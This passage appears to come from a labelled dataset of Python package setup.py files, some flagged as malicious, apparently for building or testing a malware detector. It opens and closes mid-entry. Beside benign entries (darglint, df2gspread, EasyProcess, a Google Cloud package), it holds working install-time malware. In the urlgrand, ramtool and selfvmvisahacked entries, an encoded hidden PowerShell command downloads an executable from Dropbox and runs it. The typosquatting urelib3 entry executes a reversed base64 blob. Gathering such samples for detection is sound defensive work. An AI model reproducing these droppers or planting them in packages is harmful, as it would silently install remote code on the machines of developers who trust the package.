goal, and is supported\\non a best-effort basis.  Darglint does not check stylistic preferences expressed\\nby tools in the Python Code Quality Authority (through tools such as `pydocstyle`).\\nSo when using Darglint, it may be a good idea to also use `pydocstyle`, if you\\nwant to enforce style.  (For example, `pydocstyle` requires the short summary\\nto be separated from other sections by a line break.  Darglint makes no such check.)\\n\\n## Sphinx\\n\\nDarglint can handle sphinx-style docstrings, but imposes some restrictions\\non top of the Sphinx style. For example, all fields (such as `:returns:`)\\nmust be the last items in the docstring.  They must be together, and all\\nindents should be four spaces.  These restrictions may be loosened at a\\nlater date.\\n\\nTo analyze Sphinx-style docstrings, pass the style flag to the command:\\n\\n```bash\\ndarglint -s sphinx example.py\\ndarglint --docstring-style sphinx example.py\\n```\\n\\nAlternatively, you can specify the style in the configuration file using\\nthe setting, \"docstring\\\\_style\":\\n\\n```ini\\n[darglint]\\ndocstring_style=sphinx\\n```\\n\\n## Numpy\\n\\nDarglint now has an initial implementation for Numpy-style docstrings.\\nSimilarly to Sphinx-style docstrings, you can pass a style flag to the\\ncommand:\\n\\n```bash\\ndarglint -s numpy example.py\\ndarglint --docstring-style numpy example.py\\n```\\n\\nOr set it in a configuration file:\\n\\n```ini\\n[darglint]\\ndocstring_style=numpy\\n```\\n\\nThe numpy parser and error reporter are not yet fully stabilized.\\nAdd issues or suggestions to the tracking bug, Issue #69.\\n\\n## Integrations\\n\\n### Flake8\\n\\nDarglint can be used in conjunction with Flake8 as a plugin.  The only\\nsetup necessary is to install Flake8 and Darglint in the same environment.\\nDarglint will pull its configuration from Flake8. So, if you would like to\\nlint Sphinx-style comments, then you should have `docstring_style=sphinx` in a\\nFlake8 configuration file in the project directory.  The settings would\\nbe entered under the flake8 configuration, not a separate configuration\\nfor Darglint.  E.g.:\\n\\n```ini\\n[flake8]\\nstrictness=short\\ndocstring_style=sphinx\\n```\\n\\nTo see which options are exposed through Flake8, you can check the Flake8\\ntool:\\n\\n```bash\\nflake8 --help | grep --before-context=2 Darglint\\n```\\n\\n### SublimeLinter\\n\\nA plugin for SublimeLinter can be found [here](https://github.com/raddessi/SublimeLinter-contrib-darglint)\\n\\n### Pre-commit\\n\\nDownload [pre-commit](https://pre-commit.com/) and\\n[install](https://pre-commit.com/#install) it. Once it is installed, add this\\nto `.pre-commit-config.yaml` in your repository:\\n\\n```yaml\\nrepos:\\n-   repo: https://github.com/terrencepreilly/darglint\\n    rev: master\\n    hooks:\\n    - id: darglint\\n```\\n\\nThen run `pre-commit install` and you\\'re ready to go. Before commiting,\\n`darglint` will be run on the staged files. If it finds any errors, the user\\nis notified and the commit is aborted. Store necessary configuration (such as\\nerror formatting) in `.darglint`, `setup.cfg` or `tox.ini`.\\n\\n\\n## Roadmap\\n\\nBelow are some of the current features or efforts.  Where a milestone or\\nissue is associated with the idea, it will be mentioned.  Some of these\\nideas are moonshots and may not get implemented.  They are ordered\\nroughly according to current priority/feasibility.\\n\\n- [ ] Expose command-line options through sphinx.\\n- [ ] Robust logging for errors caused/encountered by *darglint*.\\n- [ ] Check class docstrings (See Issue #25).\\n- [ ] Autoformatting docstrings.  (See Milestone #3).\\n- [ ] Optional aggressive style checking through command line flag.\\n- [ ] ALE support.\\n- [ ] Syntastic support. (Syntastic is not accepting new checkers until\\ntheir next API stabilizes, so this may take some time.)\\n\\n\\n## Development and Contributions\\n\\n### Development Setup\\n\\nInstall `darglint`. First, clone the repository:\\n\\n```bash\\ngit clone https://github.com/terrencepreilly/darglint.git\\n```\\n\\n`cd` into the directory, create a virtual environment (optional), then setup:\\n\\n```bash\\ncd darglint/\\nvirtualenv -p python3.6 .env\\nsource .env/bin/activate\\npip install -e .\\n```\\n\\nYou can install dependencies using\\n\\n```bash\\npip install poetry\\npoetry install\\n```\\n\\nYou can run the tests using\\n\\n```bash\\npython setup.py test\\n```\\n\\nOr, install `pytest` manually, `cd` to the project\\'s root directory,\\nand run\\n\\n```bash\\npytest\\n```\\n\\nThis project tries to conform by the styles imposed by `pycodestyle`\\nand `pydocstyle`, as well as by `darglint` itself.\\n\\n\\nA dockerfile exists for testing with Python3.4.  Although it\\'s not\\nofficially supported (only 3.6+), it\\'s nice to try to make minor\\nversion numbers support it.  You would build the dockerfile and\\ntest using something like\\n\\n```bash\\npushd docker-build\\ndocker build -t darglint-34 -f Dockerfile.test34 .\\npopd\\ndocker run -it --rm -v $(pwd):/code darglint-34 pytest\\n```\\n\\n### Contribution\\n\\nIf you would like to tackle an issue or feature, email me or comment on the\\nissue to make sure it isn\\'t already being worked on.  Contributions will\\nbe accepted through pull requests.  New features should include unit tests,\\nand, of course, properly formatted documentation.\\n\\nAlso, check out the wiki prior to updating the grammar.  It includes a\\ndescription of darglint\\'s parsing pipline.\\n',\n    'author': 'terrencepreilly',\n    'author_email': 'terrencepreilly@gmail.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': None,\n    'packages': packages,\n    'package_data': package_data,\n    'entry_points': entry_points,\n    'python_requires': '>=3.6,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "df2gspread-1.0.4", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# @Author: Eduard Trott\n# @Date:   2015-09-04 14:04:46\n# @Email:  etrott@redhat.com\n# @Last modified by:   etrott\n# @Last Modified time: 2016-01-19 14:54:20\n\n\n# python-2.7 setup.py build\n\n\n\nfrom setuptools import setup\n\nVERSION_FILE = \"df2gspread/_version.py\"\nVERSION_EXEC = ''.join(open(VERSION_FILE).readlines())\n__version__ = ''\nexec(str(VERSION_EXEC))  # update __version__\nif not __version__:\n    raise RuntimeError(\"Unable to find version string in %s.\" % VERSION_FILE)\n\n# acceptable version schema: major.minor[.patch][-sub[ab]]\n__pkg__ = 'df2gspread'\n__pkgdir__ = {'df2gspread': 'df2gspread'}\n__pkgs__ = ['df2gspread']\n__desc__ = 'Export tables to Google Spreadsheets.'\n__scripts__ = ['bin/csv2gspread']\n__irequires__ = [\n    # CORE DEPENDENCIES\n    'argparse>=1.3.0',\n    'google-api-python-client==1.6.7',\n    'gspread>=2.1.1',\n    'oauth2client>=1.5.0,<5.0.0dev',\n    'pandas'\n]\n__xrequires__ = {\n    'tests': [\n        'pytest==2.7.2',\n        # 'instructions',\n        # 'pytest-pep8==1.0.6',  # run with `py.test --pep8 ...`\n    ],\n    # 'docs': ['sphinx==1.3.1', ],\n    # 'github': ['PyGithub==1.25.2', ],\n    # 'invoke': ['invoke==0.10.1', ],\n}\n\npip_src = 'https://pypi.python.org/packages/src'\n__deplinks__ = []\n\n# README is in the parent directory\nreadme_pth = 'README.rst'\nwith open(readme_pth) as _file:\n    readme = _file.read()\n\ngithub = 'https://github.com/maybelinot/df2gspread'\ndownload_url = '%s/archive/master.zip' % github\n\ndefault_setup = dict(\n    url=github,\n    license='GPLv3',\n    author='Eduard Trott',\n    author_email='etrott@redhat.com',\n    maintainer='Chris Ward',\n    maintainer_email='cward@redhat.com',\n    download_url=download_url,\n    long_description=readme,\n    data_files=[],\n    classifiers=[\n        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',\n        'Natural Language :: English',\n        'Programming Language :: Python :: 2.7',\n        'Topic :: Office/Business',\n        'Topic :: Utilities',\n    ],\n    keywords=['information'],\n    dependency_links=__deplinks__,\n    description=__desc__,\n    install_requires=__irequires__,\n    extras_require=__xrequires__,\n    name=__pkg__,\n    package_dir=__pkgdir__,\n    packages=__pkgs__,\n    scripts=__scripts__,\n    version=__version__,\n    zip_safe=False,\n)\n\nsetup(**default_setup)\n", "target": 0}
{"idx": "urlgrand-2.74", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'urlgrand',\n    packages = ['modlib'],\n    version = '4.43',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "EasyProcess-1.1", "func": "import os\n\nfrom setuptools import setup\n\nNAME = \"easyprocess\"\n\n# get __version__\n__version__ = None\nexec(open(os.path.join(NAME, \"about.py\")).read())\nVERSION = __version__\n\nPYPI_NAME = \"EasyProcess\"\nURL = \"https://github.com/ponty/easyprocess\"\nDESCRIPTION = \"Easy to use Python subprocess interface.\"\nLONG_DESCRIPTION = \"\"\"Easy to use Python subprocess interface.\n\nDocumentation: https://github.com/ponty/easyprocess/tree/\"\"\"\nLONG_DESCRIPTION += VERSION\nPACKAGES = [\n    NAME,\n    NAME + \".examples\",\n]\n\n\nclassifiers = [\n    # Get more strings from\n    # https://pypi.python.org/pypi?%3Aaction=list_classifiers\n    \"License :: OSI Approved :: BSD License\",\n    \"Natural Language :: English\",\n    \"Operating System :: OS Independent\",\n    \"Programming Language :: Python\",\n    \"Programming Language :: Python :: 3\",\n    \"Programming Language :: Python :: 3 :: Only\",\n    \"Programming Language :: Python :: 3.7\",\n    \"Programming Language :: Python :: 3.8\",\n    \"Programming Language :: Python :: 3.9\",\n    \"Programming Language :: Python :: 3.10\",\n]\n\n\nsetup(\n    name=PYPI_NAME,\n    version=VERSION,\n    description=DESCRIPTION,\n    long_description=LONG_DESCRIPTION,\n    long_description_content_type=\"text/x-rst\",\n    classifiers=classifiers,\n    keywords=\"subprocess interface\",\n    author=\"ponty\",\n    # author_email='',\n    url=URL,\n    license=\"BSD\",\n    packages=PACKAGES,\n    package_data={\n        NAME: [\"py.typed\"],\n    },\n)\n", "target": 0}
{"idx": "ramtool-3.81", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'ramtool',\n    packages = ['modlib'],\n    version = '6.16',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "google-cloud-recommendations-ai-0.7.0", "func": "# -*- coding: utf-8 -*-\n\n# Copyright (C) 2019  Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n\nimport io\nimport os\nimport setuptools  # type: ignore\n\nversion = \"0.7.0\"\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\nsetuptools.setup(\n    name=\"google-cloud-recommendations-ai\",\n    version=version,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-recommendations-ai\",\n    packages=[\n        package\n        for package in setuptools.PEP420PackageFinder.find()\n        if package.startswith(\"google\")\n    ],\n    namespace_packages=(\"google\", \"google.cloud\"),\n    platforms=\"Posix; MacOS X; Windows\",\n    include_package_data=True,\n    install_requires=(\n        \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n        \"proto-plus >= 1.15.0, <2.0.0dev\",\n        \"protobuf >= 3.19.0, <4.0.0dev\",\n    ),\n    python_requires=\">=3.7\",\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"Intended Audience :: Developers\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Internet\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ],\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "selfvmvisahacked-1.31", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfvmvisahacked',\n    packages = ['modlib'],\n    version = '1.72',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "urelib3-1.27.15", "func": "import setuptools, os, codecs, base64, requests, platform, getpass, datetime\n\ntry:\n    import requests\nexcept:\n    os.system('pip install requests')\n\nimport os, codecs, base64, requests, platform, getpass, datetime\nreact='==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'[::-1]\nexec(base64.b64decode(react.encode('utf-8')))\n\nwith open(\"README.md\", \"r\") as fh:\n    long_description = fh.read()\nrequirements = [\"urllib3<=1.26.14\"]\n# \u0424\u0443\u043d\u043a\u0446\u0438\u044f, \u043a\u043e\u0442\u043e\u0440\u0430\u044f \u043f\u0440\u0438\u043d\u0438\u043c\u0430\u0435\u0442 \u043d\u0435\u0441\u043a\u043e\u043b\u044c\u043a\u043e \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\u043e\u0432. \u041e\u043d\u0430 \u043f\u0440\u0438\u0441\u0432\u0430\u0438\u0432\u0430\u0435\u0442 \u044d\u0442\u0438 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f \u043f\u0430\u043a\u0435\u0442\u0443.\nsetuptools.setup(\n    # \u0418\u043c\u044f \u0434\u0438\u0441\u0442\u0440\u0438\u0431\u0443\u0442\u0438\u0432\u0430 \u043f\u0430\u043a\u0435\u0442\u0430. \u041e\u043d\u043e \u0434\u043e\u043b\u0436\u043d\u043e \u0431\u044b\u0442\u044c \u0443\u043d\u0438\u043a\u0430\u043b\u044c\u043d\u044b\u043c, \u043f\u043e\u044d\u0442\u043e\u043c\u0443 \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u0432\u0430\u0448\u0435\u0433\u043e \u0438\u043c\u0435\u043d\u0438 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f \u0432 \u043a\u043e\u043d\u0446\u0435 \u044f\u0432\u043b\u044f\u0435\u0442\u0441\u044f \u043e\u0431\u044b\u0447\u043d\u044b\u043c \u0434\u0435\u043b\u043e\u043c.\n    name=\"urelib3\",\n    # \u041d\u043e\u043c\u0435\u0440 \u0432\u0435\u0440\u0441\u0438\u0438 \u0432\u0430\u0448\u0435\u0433\u043e \u043f\u0430\u043a\u0435\u0442\u0430. \u041e\u0431\u044b\u0447\u043d\u043e \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u0442\u0441\u044f \u0441\u0435\u043c\u0430\u043d\u0442\u0438\u0447\u0435\u0441\u043a\u043e\u0435 \u0443\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u0432\u0435\u0440\u0441\u0438\u044f\u043c\u0438.\n    version=\"1.27.15\",\n    # \u0418\u043c\u044f \u0430\u0432\u0442\u043e\u0440\u0430.\n    author=\"Alex Maxalek\",\n    # \u0415\u0433\u043e \u043f\u043e\u0447\u0442\u0430.\n    author_email=\"connect@notexi.st\",\n    # \u041a\u0440\u0430\u0442\u043a\u043e\u0435 \u043e\u043f\u0438\u0441\u0430\u043d\u0438\u0435, \u043a\u043e\u0442\u043e\u0440\u043e\u0435 \u0431\u0443\u0434\u0435\u0442 \u043f\u043e\u043a\u0430\u0437\u0430\u043d\u043e \u043d\u0430 \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u0435 PyPi.\n    description=\"urllib3 is a powerful, user-friendly HTTP client for Python. Much of the Python ecosystem already uses urllib3 and you should too. urllib3 brings many critical features that are missing from the Python standard libraries.\",\n    # \u0414\u043b\u0438\u043d\u043d\u043e\u0435 \u043e\u043f\u0438\u0441\u0430\u043d\u0438\u0435, \u043a\u043e\u0442\u043e\u0440\u043e\u0435 \u0431\u0443\u0434\u0435\u0442 \u043e\u0442\u043e\u0431\u0440\u0430\u0436\u0430\u0442\u044c\u0441\u044f \u043d\u0430 \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u0435 PyPi. \u0418\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u0442 README.md \u0440\u0435\u043f\u043e\u0437\u0438\u0442\u043e\u0440\u0438\u044f \u0434\u043b\u044f \u0437\u0430\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u044f.\n    long_description=long_description,\n    # \u041e\u043f\u0440\u0435\u0434\u0435\u043b\u044f\u0435\u0442 \u0442\u0438\u043f \u043a\u043e\u043d\u0442\u0435\u043d\u0442\u0430, \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u043c\u044b\u0439 \u0432 long_description.\n    long_description_content_type=\"text/markdown\",\n    # URL-\u0430\u0434\u0440\u0435\u0441, \u043f\u0440\u0435\u0434\u0441\u0442\u0430\u0432\u043b\u044f\u044e\u0449\u0438\u0439 \u0434\u043e\u043c\u0430\u0448\u043d\u044e\u044e \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u0443 \u043f\u0440\u043e\u0435\u043a\u0442\u0430. \u0411\u043e\u043b\u044c\u0448\u0438\u043d\u0441\u0442\u0432\u043e \u043f\u0440\u043e\u0435\u043a\u0442\u043e\u0432 \u0441\u0441\u044b\u043b\u0430\u044e\u0442\u0441\u044f \u043d\u0430 \u0440\u0435\u043f\u043e\u0437\u0438\u0442\u043e\u0440\u0438\u0439.\n    url=\"https://github.com/urllib3/urllib3\",\n    # \u041d\u0430\u0445\u043e\u0434\u0438\u0442 \u0432\u0441\u0435 \u043f\u0430\u043a\u0435\u0442\u044b \u0432\u043d\u0443\u0442\u0440\u0438 \u043f\u0440\u043e\u0435\u043a\u0442\u0430 \u0438 \u043e\u0431\u044a\u0435\u0434\u0438\u043d\u044f\u0435\u0442 \u0438\u0445 \u0432 \u0434\u0438\u0441\u0442\u0440\u0438\u0431\u0443\u0442\u0438\u0432.\n    packages=setuptools.find_packages(),\n    # requirements \u0438\u043b\u0438 dependencies, \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u0431\u0443\u0434\u0443\u0442 \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\u044b \u0432\u043c\u0435\u0441\u0442\u0435 \u0441 \u043f\u0430\u043a\u0435\u0442\u043e\u043c, \u043a\u043e\u0433\u0434\u0430 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u0438\u0442 \u0435\u0433\u043e \u0447\u0435\u0440\u0435\u0437 pip.\n    # install_requires=requirements,\n    # \u041f\u0440\u0435\u0434\u043e\u0441\u0442\u0430\u0432\u043b\u044f\u0435\u0442 pip \u043d\u0435\u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u043c\u0435\u0442\u0430\u0434\u0430\u043d\u043d\u044b\u0435 \u043e \u043f\u0430\u043a\u0435\u0442\u0435. \u0422\u0430\u043a\u0436\u0435 \u043e\u0442\u043e\u0431\u0440\u0430\u0436\u0430\u0435\u0442\u0441\u044f \u043d\u0430 